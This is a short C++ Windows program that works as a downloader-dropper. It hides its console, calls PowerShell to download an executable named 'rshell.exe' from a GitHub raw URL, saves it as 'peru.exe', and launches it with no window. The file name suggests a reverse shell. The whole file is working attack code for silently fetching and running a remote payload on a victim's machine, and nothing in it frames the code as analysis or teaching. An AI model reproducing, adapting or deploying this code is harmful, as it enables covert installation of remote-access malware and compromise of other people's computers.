#include <windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>

int main()
{
    FreeConsole();
    const std::string filename = "peru.exe";
    const std::string command = "powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/addliam/pyterminal/raw/main/garbage/rshell.exe', '" + filename + "')\"";
    const char *downloadcmd = command.c_str();
    system(downloadcmd);
    const char *url = "https://github.com/addliam/pyterminal/raw/main/garbage/rshell.exe";

    // Execute the downloaded file
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    TCHAR cmd[] = _T("peru.exe");

    // Start the child process.
    if (!CreateProcess(NULL,             // No module name (use command line)
                       cmd,              // Command line
                       NULL,             // Process handle not inheritable
                       NULL,             // Thread handle not inheritable
                       FALSE,            // Set handle inheritance to FALSE
                       CREATE_NO_WINDOW, // No creation flags
                       NULL,             // Use parent's environment block
                       NULL,             // Use parent's starting directory
                       &si,              // Pointer to STARTUPINFO structure
                       &pi)              // Pointer to PROCESS_INFORMATION structure
    )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }
    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);
    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
